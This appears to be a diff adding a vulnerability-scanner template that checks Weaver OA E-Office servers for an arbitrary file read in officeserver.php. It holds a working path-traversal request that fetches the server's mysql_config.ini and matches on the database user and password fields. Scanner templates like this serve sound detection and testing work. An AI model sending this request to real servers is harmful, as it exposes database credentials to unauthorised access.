@@ -1,0 +1,25 @@
+id: weaver-officeserver-lfi
+name: OA E-Office officeserver.php Arbitrary File Read
+severity: high
+confidence: confirmed
+description: There is an arbitrary file reading vulnerability in the OA E-Office officeserver.php file. An attacker can download
+  any file on the server through the vulnerability.
+reference: https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20officeserver.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+tags:
+- weaver
+- e-cology
+- oa
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
+  matchers:
+  - type: body
+    words:
+    - datapassword =
+    - datauser =
+  - type: status
+    status:
+    - 200
+  condition: and
